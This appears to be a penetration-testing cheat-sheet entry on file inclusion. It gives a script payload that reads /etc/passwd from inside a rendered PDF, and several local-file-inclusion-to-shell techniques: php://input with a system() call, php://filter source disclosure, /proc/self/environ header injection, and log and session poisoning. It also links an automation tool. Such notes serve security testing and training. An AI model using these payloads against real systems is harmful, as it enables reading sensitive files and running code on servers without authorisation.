# File Inclusion

### PDF

```text
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

### LFI to shell

* use `page=php://input`, payload must be in the POST Body \(but the request is GET\), e.g. `<?php echo system('whoami');?>`, this is also possible for `zip://` and `phar://`
* get source code with filter: `page=php://filter/convert.base64-encode/resource=<filename>`
* `page=../../../../../proc/self/environ`, if this is accessible we can set the user agent to php code in `<?php .. ?>` and get it executed, this can also be done for `/proc/self/id/<id>` and the referrer field \(bruteforce the id\)
* log poisoning, write php into log via error message and request via lfi
* session poisoning, write a malicious session variable and include the session from `/var/lib/phpX/sess_<phpsessid>`

Many of these techniques are automated and implemented in [LFISuite](https://github.com/D35m0nd142/LFISuite).

